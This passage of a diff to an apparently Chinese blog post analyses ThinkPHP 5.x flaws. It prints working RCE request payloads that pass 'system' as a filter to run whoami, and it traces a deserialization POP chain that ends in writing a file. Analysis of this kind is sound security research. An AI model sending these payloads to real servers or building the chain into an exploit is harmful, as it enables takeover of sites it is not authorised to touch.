+<pre><code>?s=index/\think\Request/input&amp;filter[]=system&amp;data=whoami</code></pre><p>自动跟随debug调用函数跟进。开始在controller这可以看见<code>$result</code>变量是存储了我们传入的值的数组。其值分别为<code>index</code>,<code>\think\Request</code>,<code>input</code>.<br>一路跟下去会发现执行代码的关键位置在<br>thinkphp\library\think\route\dispatch\Module.php</p>
+<pre><code class="php">public function exec()
+{
+    // 监听module_init
+    $this-&gt;app[&#39;hook&#39;]-&gt;listen(&#39;module_init&#39;);
+
+    try {
+        // 实例化控制器
+        $instance = $this-&gt;app-&gt;controller($this-&gt;controller,
+            $this-&gt;rule-&gt;getConfig(&#39;url_controller_layer&#39;),
+            $this-&gt;rule-&gt;getConfig(&#39;controller_suffix&#39;),
+            $this-&gt;rule-&gt;getConfig(&#39;empty_controller&#39;));
+    } catch (ClassNotFoundException $e) {
+        throw new HttpException(404, &#39;controller not exists:&#39; . $e-&gt;getClass());
+    }
+
+    $this-&gt;app[&#39;middleware&#39;]-&gt;controller(function (Request $request, $next) use ($instance) {
+        // 获取当前操作名
+        $action = $this-&gt;actionName . $this-&gt;rule-&gt;getConfig(&#39;action_suffix&#39;);
+
+        if (is_callable([$instance, $action])) {
+            // 执行操作方法
+            $call = [$instance, $action];
+
+            // 严格获取当前操作方法名
+            $reflect    = new ReflectionMethod($instance, $action);
+            $methodName = $reflect-&gt;getName();
+            $suffix     = $this-&gt;rule-&gt;getConfig(&#39;action_suffix&#39;);
+            $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName;
+            $this-&gt;request-&gt;setAction($actionName);
+
+            // 自动获取请求变量
+            $vars = $this-&gt;rule-&gt;getConfig(&#39;url_param_type&#39;)
+            ? $this-&gt;request-&gt;route()
+            : $this-&gt;request-&gt;param();
+        } elseif (is_callable([$instance, &#39;_empty&#39;])) {
+            // 空操作
+            $call    = [$instance, &#39;_empty&#39;];
+            $vars    = [$this-&gt;actionName];
+            $reflect = new ReflectionMethod($instance, &#39;_empty&#39;);
+        } else {
+            // 操作不存在
+            throw new HttpException(404, &#39;method not exists:&#39; . get_class($instance) . &#39;-&gt;&#39; . $action . &#39;()&#39;);
+        }
+
+        $this-&gt;app[&#39;hook&#39;]-&gt;listen(&#39;action_begin&#39;, $call);
+
+        $data = $this-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);
+
+        return $this-&gt;autoResponse($data);
+    });
+
+    return $this-&gt;app[&#39;middleware&#39;]-&gt;dispatch($this-&gt;request, &#39;controller&#39;);
+}</code></pre>
 <p>仔细一看其实就是调用了反射方法。用<code>$this-&gt;controller</code>,<code>$this-&gt;actionName</code>.因为之前我们知道Request 类的input函数会对输入执行call_user_func操作。因此最后执行了<code>call_user_func(&#39;system&#39;,&#39;whoami&#39;)</code><br>因此官方最后的修复是针对输入控制器名进行过滤<code>^[A-Za-z](\w)*$</code></p>
 <h2 id="tp-5-rce-post"><a href="#tp-5-rce-post" class="headerlink" title="tp-5.*-rce-post"></a>tp-5.*-rce-post</h2><p>首先这个rce版本5.0.*应该是小于5.0.24的。所以用一个5.0.23版本的实验下。</p>
 <p>首先payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?s&#x3D;index&#x2F;index HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;whoami</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/08/05/Thinkphp-vuln/16.PNG" class="lazyload" data-srcset="16.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>这里因为我的Index.php是之前实验ifi时的。所以index/index路由返回Cache Success.实际上<code>s</code>只需要赋给一个存在method的控制器即可。</p>
+<pre><code>POST /?s=index/index HTTP/1.1
+_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</code></pre><p><img src="/2020/08/05/Thinkphp-vuln/16.PNG" class="lazyload" data-srcset="16.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>这里因为我的Index.php是之前实验ifi时的。所以index/index路由返回Cache Success.实际上<code>s</code>只需要赋给一个存在method的控制器即可。</p>
 <p>下面来跟下源码。首先从官方commit修改处可以看出原先代码中<code>this-&gt;$method</code>变量来自可控数据<code>$_POST</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[Config::get(<span class="string">'var_method'</span>)])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;method = strtoupper($_POST[Config::get(<span class="string">'var_method'</span>)]);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;method&#125;($_POST);</span><br></pre></td></tr></table></figure>
+<pre><code class="php">if (isset($_POST[Config::get(&#39;var_method&#39;)])) {
+            $this-&gt;method = strtoupper($_POST[Config::get(&#39;var_method&#39;)]);
+            $this-&gt;{$this-&gt;method}($_POST);</code></pre>
 <p>那么我们就可以调用Request类的method了。看到payload中存在__construct。自然看向构造方法</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($options = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($options <span class="keyword">as</span> $name =&gt; $item) &#123;</span><br><span class="line">        <span class="keyword">if</span> (property_exists(<span class="keyword">$this</span>, $name)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$name = $item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;filter)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = Config::get(<span class="string">'default_filter'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存 php://input</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;input = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">protected function __construct($options = [])
+{
+    foreach ($options as $name =&gt; $item) {
+        if (property_exists($this, $name)) {
+            $this-&gt;$name = $item;
+        }
+    }
+    if (is_null($this-&gt;filter)) {
+        $this-&gt;filter = Config::get(&#39;default_filter&#39;);
+    }
+
+    // 保存 php://input
+    $this-&gt;input = file_get_contents(&#39;php://input&#39;);
+}</code></pre>
 <p>这个foreach明显存在配置覆盖的写法。这里继续下断点一路跟发现会根据app_debug的值前往当前类下param方法。<br>而这个方法全都走input方法。也就是都会调用了<code>call_user_func</code>。<br>具体可以看这张图<br><img src="/2020/08/05/Thinkphp-vuln/17.PNG" class="lazyload" data-srcset="17.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>前面提到我们可以覆盖属性。这里主要就是覆盖<code>filter</code>跟<code>server</code>。因为method方法中是取的我们传入的<code>this-&gt;server[&#39;REQUEST_METHOD&#39;]</code>的值。所以覆盖为<code>whoami</code>后作为参数被送到input.input又因为filtervalue方法调用call_user_func。直接利用覆盖的<code>system</code>作为fliter值即可。<br>最后到达call_user_func rce<br><img src="/2020/08/05/Thinkphp-vuln/18.PNG" class="lazyload" data-srcset="18.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <h2 id="tp5-0-x-unserialize"><a href="#tp5-0-x-unserialize" class="headerlink" title="tp5.0.x-unserialize"></a>tp5.0.x-unserialize</h2><p>这一部分主要是跟下tp5.0版本的反序列化pop链。不过这里不会分享exp.(网上跟先知应该都能很方便找到)。如果需要的话自己SCTF2020wp里有绕过短标签的exp。以及以前跟php框架有几个其他的exp可以自行寻找。当然我记得wh1t3P1g大佬自己把tp的popchain集成到phpggc中了。也可以自动生成。</p>
 <p>然后就是windows下写文件的方法。目前能够在php7以前的版本写shell exp是有的。但php7的windows写shell我还没成功过。理论上windows不能成功的原因只是因为文件名不允许<code>&lt;</code>,<code>?</code>的。但是如果用过滤器绕过的话应该是没问题的……<br>php5.4.45+windows 成功写入phpinfo() (关闭短标签)<br><img src="/2020/08/05/Thinkphp-vuln/19.PNG" class="lazyload" data-srcset="19.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>这里我就直接跟下linux的payload吧。<br>首先是入口点。肯定是找<code>__destruct</code>函数。不难发现一共只有几个可用。我们找到 library\think\process\pipes下windows.php。发现其调用了<code>$this-&gt;removeFiles</code>.而<code>removeFiles</code>又调用了<code>file_exists</code>可以触发<code>__toString</code>方法。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">            @unlink($filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;files = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">private function removeFiles()
+{
+    foreach ($this-&gt;files as $filename) {
+        if (file_exists($filename)) {
+            @unlink($filename);
+        }
+    }
+    $this-&gt;files = [];
+}</code></pre>
 <p>ps.关于file_exists可以触发<code>__toString</code>自己以前还没有注意过。具体不妨去l3m0n师傅<a href="https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html" target="_blank" rel="noopener">这篇文章</a>下评论看看。<br>(应该是因为file_exists接受字符串参数,而只要对象被当做字符串即会触发<code>__toString</code>)<br>全局继续找<code>toString</code>.也只有几个选择。这里找到 think\Model.php<br>.它调用了<code>toJson</code>。而<code>toJson</code>继续调用了<code>toArray</code>.</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span><span class="params">($options = JSON_UNESCAPED_UNICODE)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="php">public function toJson($options = JSON_UNESCAPED_UNICODE)
+{
+    return json_encode($this-&gt;toArray(), $options);
+}</code></pre>
 <p>同时注意这里Model类是抽象类。所以实际编写exp时我们必须用它的子类。比如此处的Pivot。<br>我们直接来到toArray。这里首先主要看有没有可以触发<code>__call</code>的情况。5.0.24版本下应该又三处都是可以满足的</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$relation = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">$value = <span class="keyword">$this</span>-&gt;getRelationData($modelRelation);</span><br><span class="line">$item[$key] = $value ? $value-&gt;getAttr($attr) : <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">$relation = $this-&gt;getAttr($key);
+$value = $this-&gt;getRelationData($modelRelation);
+$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</code></pre>
 <p>与其说是找触发<code>__call</code>的。不如说是找可用方法。多数情况下这些方法基本利用不了。但是如果满足<code>this-&gt;xxx($var)</code>或者进一步<code>可控类-&gt;xxx(可控变量)</code>。我们就能找任意类的<code>__call</code>进行进一步挖掘。这也是pop链中call方法经常用到的原因之一。</p>
 <p>为了了解我们如何控制这一步用来调用<code>__call</code>。我们先放一下全局找<code>__call</code>的过程。来选择一个触发方式。<br>对于<code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</code><br>这里看看<code>$value</code>与<code>$attr</code>依次是怎么被赋值的。<br><img src="/2020/08/05/Thinkphp-vuln/20.PNG" class="lazyload" data-srcset="20.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>value</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$relation = Loader::parseName($name, <span class="number">1</span>, <span class="keyword">false</span>);</span><br><span class="line">$modelRelation = <span class="keyword">$this</span>-&gt;$relation();</span><br><span class="line">$value         = <span class="keyword">$this</span>-&gt;getRelationData($modelRelation);</span><br></pre></td></tr></table></figure>
+<pre><code class="php">$relation = Loader::parseName($name, 1, false);
+$modelRelation = $this-&gt;$relation();
+$value         = $this-&gt;getRelationData($modelRelation);</code></pre>
 <p>主要是对<code>$name</code>调用parseName。而<code>$name</code>来自可控数组<code>$this-&gt;append</code>。<br><img src="/2020/08/05/Thinkphp-vuln/21.PNG" class="lazyload" data-srcset="21.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>也就是说。<code>$modelrelation</code>是Model这个类任意方法的返回值。(.<code>$relation()</code>)。所以找一个直接返回可控数据的方法即可。比如getError</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getError</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function getError()
+{
+    return $this-&gt;error;
+}</code></pre>
 <p>回到上面。现在我们继续跟进getRelationData</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelationData</span><span class="params">(Relation $modelRelation)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class(<span class="keyword">$this</span>-&gt;parent)) &#123;</span><br><span class="line">        $value = <span class="keyword">$this</span>-&gt;parent;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 首先获取关联数据</span></span><br><span class="line">        <span class="keyword">if</span> (method_exists($modelRelation, <span class="string">'getRelation'</span>)) &#123;</span><br><span class="line">            $value = $modelRelation-&gt;getRelation();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> BadMethodCallException(<span class="string">'method not exists:'</span> . get_class($modelRelation) . <span class="string">'-&gt; getRelation'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">protected function getRelationData(Relation $modelRelation)
+{
+    if ($this-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)) {
+        $value = $this-&gt;parent;
+    } else {
+        // 首先获取关联数据
+        if (method_exists($modelRelation, &#39;getRelation&#39;)) {
+            $value = $modelRelation-&gt;getRelation();
+        } else {
+            throw new BadMethodCallException(&#39;method not exists:&#39; . get_class($modelRelation) . &#39;-&gt; getRelation&#39;);
+        }
+    }
+    return $value;
+}</code></pre>
 <p>首先它接收的参数是<code>Relation</code>类的。所以我们上面返回的结果<code>$this-&gt;error</code>肯定也是一个<code>Relation</code>的对象了。（Relation也是抽象类。所以实例化时要用它的子类）<br>然后此处我们自然要走第一个if分支来控制返回值。分别看下<code>isSelfRelation()</code>跟<code>getModel()</code>发现都只是简单返回<code>this-&gt;relation</code>与<code>this-&gt;query-&gt;model()</code>。全部可控。<br>那只剩下让<code>get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)</code>成立了。<br>意思就是<code>$modelRelation-&gt;getModel()</code>和<code>$this-&gt;parent</code>为同类，也就是要求<code>$value-&gt;getAttr($attr)</code>中的<code>$value</code>和上面可控的model为同类<br>那么现在<code>$value-&gt;getAttr($attr)</code>的<code>value</code>跟完了。我们来看看<code>$attr</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$bindAttr = $modelRelation-&gt;getBindAttr();</span><br><span class="line"><span class="keyword">if</span> ($bindAttr) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($bindAttr <span class="keyword">as</span> $key =&gt; $attr)</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure>
+<pre><code class="php">$bindAttr = $modelRelation-&gt;getBindAttr();
+if ($bindAttr) {
+    foreach ($bindAttr as $key =&gt; $attr)
+    ......</code></pre>
 <p>上面提到过，<code>modelRelation</code>因为取自可控方法所以是任意值。我们直接全局找<code>getBindAttr</code>方法。只有一个接口类:Relation的子类OnetoOne</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBindAttr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;bindAttr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function getBindAttr()
+{
+    return $this-&gt;bindAttr;
+}</code></pre>
 <p>数据可控。不过OnetoOne是抽象类。所以继续找子类。这里就只有两个子类。我们选择<code>HasOne</code>.</p>
 <p>现在。我们做到了任意调用<code>__call</code>。剩下的就是找可用的<code>__call</code>。</p>
 <p>那么全局找可用的<code>__call</code>。此处可以找到<br>think\console\Output 类。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (in_array($method, <span class="keyword">$this</span>-&gt;styles)) &#123;</span><br><span class="line">        array_unshift($args, $method);</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>, <span class="string">'block'</span>], $args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;handle &amp;&amp; method_exists(<span class="keyword">$this</span>-&gt;handle, $method)) &#123;</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>-&gt;handle, $method], $args);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'method not exists:'</span> . <span class="keyword">__CLASS__</span> . <span class="string">'-&gt;'</span> . $method);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function __call($method, $args)
+{
+    if (in_array($method, $this-&gt;styles)) {
+        array_unshift($args, $method);
+        return call_user_func_array([$this, &#39;block&#39;], $args);
+    }
+
+    if ($this-&gt;handle &amp;&amp; method_exists($this-&gt;handle, $method)) {
+        return call_user_func_array([$this-&gt;handle, $method], $args);
+    } else {
+        throw new Exception(&#39;method not exists:&#39; . __CLASS__ . &#39;-&gt;&#39; . $method);
+    }
+}</code></pre>
 <p>那么首先上面触发点里<code>$this-&gt;parent</code>肯定是要传Output类的实例了。<br>下面看这里的<code>$this-&gt;block()</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">block</span><span class="params">($style, $message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;writeln(<span class="string">"&lt;&#123;$style&#125;&gt;&#123;$message&#125;&lt;/$style&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeln</span><span class="params">($messages, $type = self::OUTPUT_NORMAL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;write($messages, <span class="keyword">true</span>, $type);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($messages, $newline = false, $type = self::OUTPUT_NORMAL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;handle-&gt;write($messages, $newline, $type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">protected function block($style, $message)
+{
+    $this-&gt;writeln(&quot;&lt;{$style}&gt;{$message}&lt;/$style&gt;&quot;);
+}
+
+public function writeln($messages, $type = self::OUTPUT_NORMAL)
+{
+    $this-&gt;write($messages, true, $type);
+}
+
+public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)
+{
+    $this-&gt;handle-&gt;write($messages, $newline, $type);
+}</code></pre>
 <p>调用的是<code>$this-&gt;handle-&gt;write</code>。既然<code>$this-&gt;handle</code>可控,那么此处找一个同名的<code>write</code>方法。我们全局搜索找到Memcached类</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($sessID, $sessData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;handler-&gt;set(<span class="keyword">$this</span>-&gt;config[<span class="string">'session_name'</span>] . $sessID, $sessData, <span class="keyword">$this</span>-&gt;config[<span class="string">'expire'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function write($sessID, $sessData)
+{
+    return $this-&gt;handler-&gt;set($this-&gt;config[&#39;session_name&#39;] . $sessID, $sessData, $this-&gt;config[&#39;expire&#39;]);
+}</code></pre>
 <p>同理。还是可以全局找<code>set</code>方法。第一个就是我们曾经在tp5RCE中见到的File类</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value, $expire = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">'expire'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($expire <span class="keyword">instanceof</span> \DateTime) &#123;</span><br><span class="line">        $expire = $expire-&gt;getTimestamp() - time();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name, <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag &amp;&amp; !is_file($filename)) &#123;</span><br><span class="line">        $first = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $data = serialize($value);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">        <span class="comment">//数据压缩</span></span><br><span class="line">        $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $data   = <span class="string">"&lt;?php\n//"</span> . sprintf(<span class="string">'%012d'</span>, $expire) . <span class="string">"\n exit();?&gt;\n"</span> . $data;</span><br><span class="line">    $result = file_put_contents($filename, $data);</span><br><span class="line">    <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">        <span class="keyword">isset</span>($first) &amp;&amp; <span class="keyword">$this</span>-&gt;setTagItem($filename);</span><br><span class="line">        clearstatcache();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="php">public function set($name, $value, $expire = null)
+{
+    if (is_null($expire)) {
+        $expire = $this-&gt;options[&#39;expire&#39;];
+    }
+    if ($expire instanceof \DateTime) {
